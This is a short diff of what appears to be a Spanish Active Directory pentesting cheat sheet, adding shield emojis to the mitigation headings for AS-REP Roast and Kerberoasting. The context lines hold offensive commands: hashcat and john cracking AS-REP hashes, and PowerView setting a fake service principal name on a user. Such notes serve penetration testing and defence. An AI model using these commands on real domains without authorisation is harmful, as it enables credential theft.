@@ -5173,7 +5173,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt
 john --wordlist=rockyou.txt hashes.asreproast
 ```
 
-##### Mitigación del ataque AS-REP Roast
+##### 🛡️ Mitigación del ataque AS-REP Roast
 
 - Habilitar la preautenticación Kerberos:
 
@@ -5250,7 +5250,7 @@ Import-module .\PowerView.ps1
 Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
 ```
 
-##### Mitigación del ataque Kerberoasting
+##### 🛡️ Mitigación del ataque Kerberoasting
 
 - Utilizar contraseñas robustas.
 
